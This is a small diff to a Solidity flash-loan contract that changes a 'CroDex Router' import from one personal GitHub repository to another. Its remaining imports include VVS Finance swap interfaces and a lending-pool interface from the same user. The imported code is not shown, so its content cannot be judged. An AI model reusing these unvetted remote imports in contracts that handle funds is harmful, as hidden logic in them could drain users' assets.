@@ -13,7 +13,7 @@ import "https://github.com/vvs-finance/vvs-swap-core/blob/master/contracts/inter
 import "https://github.com/vvs-finance/vvs-swap-core/blob/master/contracts/interfaces/IVVSPair.sol";
 
 // CroDex Router
-import "https://github.com/satsaftersats/Flashloan-Contracts/blob/main/CroDexrouter.sol";
+import "https://github.com/satsaftersats/Contracts/blob/main/CroRouter.sol";
 
 // Multiplier-Finance Smart Contracts
 import "https://github.com/satsaftersats/FlashLoanInterface/blob/main/ILendingPoolProvider.sol";
